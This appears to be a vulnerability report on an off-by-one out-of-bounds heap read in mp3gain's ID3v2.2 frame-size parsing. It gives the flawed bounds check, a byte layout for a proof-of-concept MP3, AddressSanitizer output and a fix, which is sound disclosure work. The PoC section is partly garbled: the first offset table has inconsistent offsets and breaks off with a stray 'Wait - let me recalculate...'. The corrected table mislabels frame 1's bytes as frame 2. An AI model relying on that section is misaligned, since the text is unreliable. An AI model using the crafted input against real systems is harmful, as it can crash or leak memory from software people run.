# VULN 001 - Off-by-one OOB Heap Read in ID3v2.2 Frame Size Parsing

## Summary

**File**: `mp3gain/id3tag.c`
**Lines**: 583-592
**CWE**: CWE-125 (Out-of-bounds Read)

## Vulnerable Code

```c
case 2: /* ID3v2.2 */
    if (p + 5 > dlen)          // BUG: should be p + 6 > dlen
        goto badtag;
    memset(frameid, 0, 4);
    for (k = 0; ...) { ... }
    flen = (tagdata[p+3] << 16) | (tagdata[p+4] << 8) | tagdata[p+5];
    //                                                   ^^^^^^^^^^^
    //                                                   OOB when p + 5 == dlen
```

## Root Cause

An ID3v2.2 frame header is 6 bytes: 3-byte frame ID + 3-byte big-endian size.
The boundary check at line 583 only ensures 5 bytes are available (`p + 5 > dlen`),
but the code immediately reads the 6th byte (`tagdata[p+5]`) at line 592.

When `p + 5 == dlen`:
- Check: `p + 5 > dlen` => false => does NOT trigger `goto badtag`
- Line 592 reads `tagdata[p+5]` = `tagdata[dlen]` => one byte past malloc(dlen)

## Trigger Conditions

1. File begins with a valid ID3v2.2 header (`"ID3"` + version `0x02 0x00` + flags `0x00`).
2. Syncsafe tag-size field encodes `dlen = 16` (exactly two 8-byte ASAN shadow groups).
3. First frame (TT2/TIT2) with `flen=5` is processed normally; p advances to 11.
4. Second frame starts at p=11: `p+5 = 16 = dlen`, the off-by-one check passes,
   and `tagdata[16]` is read OOB into the heap right redzone.

**Invocation**: mp3gain requires the `-s i` flag to enable ID3 tag reading
(`useId3 = 1`). Without it, `ReadMP3GainID3Tag` is never called.

## PoC Construction (`vuln_001.mp3`)

```
Offset  Size  Content
------  ----  -------
0       3     "ID3"               magic
3       1     0x02                version major (ID3v2.2)
4       1     0x00                version minor
5       1     0x00                flags
6       4     00 00 00 10         syncsafe size = 16 => malloc(16)
10      3     54 54 32            TT2 frame 1 ID (maps to TIT2)
13      3     00 00 05            frame 1 size = 5
16      5     00 00 00 00 00      frame 1 data
21      3     54 54 32            TT2 frame 2 ID
24      2     00 00               first 2 of 3 size bytes for frame 2
26 (OOB) 1   ???                 third size byte: tagdata[26] where dlen=16
                                  Wait - let me recalculate...
```

Actual layout (dlen=16, body = bytes 0-15):
```
Body bytes 0-2:  TT2         frame 2 header: ID
Body bytes 3-5:  00 00 05    frame 1 size = 5
Body bytes 6-10: 00*5        frame 1 data
Body bytes 11-13: TT2        frame 2 ID (non-null: 0x54)
Body bytes 14-15: 00 00      first 2 of 3 size bytes
Body byte 16 (OOB): tagdata[16] = heap right redzone
```

Execution trace for frame 2 (p=11, dlen=16):
- Line 583: `if (11 + 5 > 16)` => `16 > 16` => false => NO goto badtag
- Line 592: `flen = (tagdata[14]<<16) | (tagdata[15]<<8) | tagdata[16]`
            tagdata[16] is **OOB** (heap-buffer-overflow)

## ASAN Confirmation

```
ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1 at 0x502000000040
    #0 id3_parse_v2_tag  (mp3gain+0xc65c8)
    #1 id3_search_tag    (mp3gain+0xc7748)
    #2 ReadMP3GainID3Tag (mp3gain+0xc8c4b)
    #3 main              (mp3gain+0x9dabf)

0x502000000040 is located 0 bytes to the right of
16-byte region [0x502000000030, 0x502000000040)
```

## Fix

Change line 583 from:
```c
if (p + 5 > dlen)
```
to:
```c
if (p + 6 > dlen)
```
This mirrors the analogous checks in the `case 3` and `case 4` branches where
`p + 10 > dlen` correctly ensures all 10 header bytes are available before reading
any of them.
